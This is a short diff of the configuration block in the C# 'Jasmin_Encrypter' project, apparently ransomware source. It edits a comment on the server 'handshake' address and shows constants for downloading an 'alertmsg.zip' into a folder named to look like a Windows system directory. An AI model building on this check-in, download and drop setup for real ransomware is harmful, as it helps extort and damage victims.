@@ -31,7 +31,7 @@ namespace Jasmin_Encrypter
 {
     class Program
     {
-        public static string hostaddr     = "http://127.0.0.1/handshake.php"; //enter the ip address of your webserver
+        public static string hostaddr     = "http://127.0.0.1/handshake.php"; //enter the of your webserver
         public static string AlertMsgLink = "http://127.0.0.1/alertmsg.zip";
         public static string AlertMsgPath = "C:\\Users\\Public\\Windows\\Ui\\";
         public static string AlertMsgFile = AlertMsgPath + "alertmsg.zip";
